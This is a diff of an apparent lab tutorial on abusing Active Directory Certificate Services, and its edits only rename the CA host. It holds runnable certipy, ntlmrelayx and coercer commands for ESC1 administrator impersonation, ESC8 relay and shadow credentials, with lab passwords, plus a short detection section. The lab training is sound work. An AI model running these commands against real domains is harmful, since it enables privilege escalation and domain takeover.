@@ -847,7 +847,7 @@ Exploit misconfigured Active Directory Certificate Services (AD CS) to impersona
 - During enumeration (find vulnerable templates)
 - For exploitation (request/forge certificates)
 - Post-exploitation (authenticate with stolen certs, shadow creds)
-- In labs with AD CS servers (like your CA01)
+- In labs with AD CS servers (like your ca01-esc)
 
 ## Modern Attack Example: ESC1 + ESC8 Chain (Certificate Impersonation & Relay)
 
@@ -858,11 +858,11 @@ Exploit misconfigured Active Directory Certificate Services (AD CS) to impersona
 certipy find -u 'alice.adams@lab.local' -p 'Passw0rd!' -dc-ip 172.28.128.21 --vulnerable -output adcs_find
 
 # Step 2: Exploit ESC1 (Enrollee Supplies Subject + Client Auth EKU)
-# Request certificate with admin UPN/SAN from vulnerable template (e.g., VulnESC1 on CA01)
+# Request certificate with admin UPN/SAN from vulnerable template (e.g., VulnESC1 on ca01-esc)
 certipy req -u 'alice.adams@lab.local' -p 'Passw0rd!' \
-  -ca 'lab-CA01-CA' -template 'VulnESC1' \
+  -ca 'LAB-ESC-CA' -template 'VulnESC1' \
   -upn 'administrator@lab.local' \
-  -dns 'dc01.lab.local' -target 'ca01.lab.local' \
+  -dns 'dc01.lab.local' -target 'ca01-esc.lab.local' \
   -dc-ip 172.28.128.21
 
 # Step 3: Authenticate as administrator using the obtained certificate (PKINIT)
@@ -870,7 +870,7 @@ certipy auth -pfx 'administrator.pfx' -dc-ip 172.28.128.21
 
 # Step 4: ESC8 (NTLM Relay to AD CS) – Coerce DC auth & steal cert
 # Start relay (from Kali)
-ntlmrelayx.py -t http://ca01.lab.local/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
+ntlmrelayx.py -t http://ca01-esc.lab.local/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
 
 # In another terminal: Coerce authentication (e.g., using PetitPotam/Coercer)
 coercer.py coerce -u 'svc_delegate@lab.local' -p 'ServiceP@ss3' \
@@ -881,7 +881,7 @@ coercer.py coerce -u 'svc_delegate@lab.local' -p 'ServiceP@ss3' \
 
 ## LAB – ADCS Abuse
 
-_(Assumes your new CA01 VM at 172.28.128.24 is domain-joined and has vulnerable templates like VulnESC1)_
+_(Assumes your ca01-esc VM at 172.28.128.25 is domain-joined and has vulnerable templates like VulnESC1)_
 
 ```bash
 # From Kali (172.28.128.10)
@@ -890,9 +890,9 @@ certipy find -u 'alice.adams@lab.local' -p 'Passw0rd!' -dc-ip 172.28.128.21 --vu
 
 # 2. Request ESC1 certificate impersonating administrator
 certipy req -u 'alice.adams@lab.local' -p 'Passw0rd!' \
-  -ca 'lab-CA01-CA' -template 'VulnESC1' \
+  -ca 'LAB-ESC-CA' -template 'VulnESC1' \
   -upn 'administrator@lab.local' \
-  -target 'ca01.lab.local' -dc-ip 172.28.128.21
+  -target 'ca01-esc.lab.local' -dc-ip 172.28.128.21
 
 # 3. Authenticate with the cert (obtain TGT + NT hash)
 certipy auth -pfx 'administrator.pfx' -dc-ip 172.28.128.21
@@ -901,7 +901,7 @@ certipy auth -pfx 'administrator.pfx' -dc-ip 172.28.128.21
 certipy shadow auto -pfx 'administrator.pfx' -account 'WIN10$' -target 'win10.lab.local'
 
 # 5. Test ESC8 relay (requires coercion setup)
-ntlmrelayx.py -t http://ca01.lab.local/certsrv/certfnsh.asp --adcs --template DomainController
+ntlmrelayx.py -t http://ca01-esc.lab.local/certsrv/certfnsh.asp --adcs --template DomainController
 # Then coerce from another session (e.g., using your svc_delegate account)
 ```
 
@@ -914,8 +914,8 @@ ntlmrelayx.py -t http://ca01.lab.local/certsrv/certfnsh.asp --adcs --template Do
 
 ## Blue-Team View
 
-- AD CS Operational logs on CA01 (Event Viewer → Applications and Services Logs → Microsoft → Windows → CertificateServices)
-- Security Event IDs on CA01:
+- AD CS Operational logs on CA01-ESC (Event Viewer → Applications and Services Logs → Microsoft → Windows → CertificateServices)
+- Security Event IDs on CA01-ESC:
   - 4886 – Certificate Services received a certificate request
   - 4887 – Certificate Services approved and issued a certificate
   - 4888 – Certificate Services denied a certificate request
